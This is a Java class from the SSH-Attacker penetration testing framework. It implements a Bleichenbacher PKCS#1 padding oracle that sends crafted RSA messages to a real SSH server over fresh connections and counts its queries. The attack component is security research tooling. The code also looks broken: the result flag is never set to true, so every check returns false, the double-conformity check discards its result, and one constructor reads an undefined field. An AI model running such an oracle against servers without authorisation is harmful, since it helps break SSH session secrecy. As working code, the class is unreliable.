/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.pkcs1.oracles;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import de.rub.nds.sshattacker.attacks.pkcs1.BleichenbacherWorkflowGenerator;
import de.rub.nds.sshattacker.attacks.response.ResponseExtractor;
import de.rub.nds.sshattacker.attacks.response.ResponseFingerprint;
import de.rub.nds.sshattacker.core.config.Config;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
import de.rub.nds.sshattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.sshattacker.core.state.State;
import de.rub.nds.sshattacker.core.workflow.DefaultWorkflowExecutor;
import de.rub.nds.sshattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.sshattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.util.MathHelper;
import java.io.IOException;
import java.security.interfaces.RSAPublicKey;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/** An oracle that communicates with a real server to check PKCS conformity */
public class BleichenbacherOracle extends Pkcs1Oracle {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config config;

    private final RSAPublicKey hostPublicKey;
    private final RSAPublicKey serverPublicKey;

    private final int maxAttempts;

    /**
     * @param hostPublicKey The public key
     * @param config Config
     */
    public BleichenbacherOracle(
            CustomRsaPublicKey hostPublicKey, CustomRsaPublicKey serverPublicKey, Config config) {
        this.hostPublicKey = hostPublicKey;
        this.serverPublicKey = serverPublicKey;
        this.blockSize =
                MathHelper.intCeilDiv(this.hostPublicKey.getModulus().bitLength(), Byte.SIZE);
        this.config = config;
        this.maxAttempts = 10;
    }

    /**
     * @param config Config
     * @param maxAttempts Number of times the oracle should repeat the query on a workflow exception
     */
    public BleichenbacherOracle(
            Config config,
            CustomRsaPublicKey hostPublicKey,
            CustomRsaPublicKey serverPublicKey,
            int maxAttempts) {
        this.hostPublicKey = hostPublicKey;
        this.serverPublicKey = serverPublicKey;
        this.blockSize = MathHelper.intCeilDiv(publicKey.getModulus().bitLength(), Byte.SIZE);
        this.config = config;
        this.maxAttempts = maxAttempts;
    }

    @Override
    public boolean checkPKCSConformity(final byte[] msg) {
        return checkPKCSConformity(msg, 0);
    }

    @Override
    public boolean[] checkDoublePKCSConformity(final byte[] msg) {

        checkPKCSConformity(msg);
        return new boolean[] {false, false};
    }

    private boolean checkPKCSConformity(final byte[] msg, int currentAttempt) {
        // we are initializing a new connection in every loop step, since most
        // of the known servers close the connection after an invalid handshake
        Config sshConfig = config;
        sshConfig.setWorkflowExecutorShouldClose(false);
        WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(sshConfig, msg);
        State state = new State(sshConfig, trace);
        WorkflowExecutor workflowExecutor = new DefaultWorkflowExecutor(state);

        numberOfQueries++;
        if (numberOfQueries % 250 == 0) {
            CONSOLE.info("Number of queries so far: {}", numberOfQueries);
        }

        boolean conform = false;
        try {
            workflowExecutor.executeWorkflow();
            if (!trace.executedAsPlanned()) {
                // Something did not execute as planned, the result may be either way
                throw new WorkflowExecutionException("Workflow did not execute as planned!");
            }
            clearConnections(state);

        } catch (WorkflowExecutionException e) {
            // If workflow execution failed, retry. This might be because a packet got lost
            LOGGER.debug("Exception during workflow execution:" + e.getLocalizedMessage(), e);
            if (currentAttempt < maxAttempts) {
                return checkPKCSConformity(msg, currentAttempt + 1);
            }
        }
        return conform;
    }

    private ResponseFingerprint getFingerprint(State state) {
        if (state.getWorkflowTrace().allActionsExecuted()) {
            return ResponseExtractor.getFingerprint(state);
        } else {
            LOGGER.debug(
                    "Could not execute Workflow. Something went wrong... Check the debug output for more information");
        }
        return null;
    }

    private void clearConnections(State state) {
        try {
            state.getSshContext();
            LOGGER.debug("Transporthandler is:");
            LOGGER.debug(state.getSshContext().getTransportHandler().toString());
            if (!state.getSshContext().getTransportHandler().isClosed()) {
                state.getSshContext().getTransportHandler().closeConnection();
            }
        } catch (IOException ex) {
            LOGGER.debug(ex);
        }
    }
}
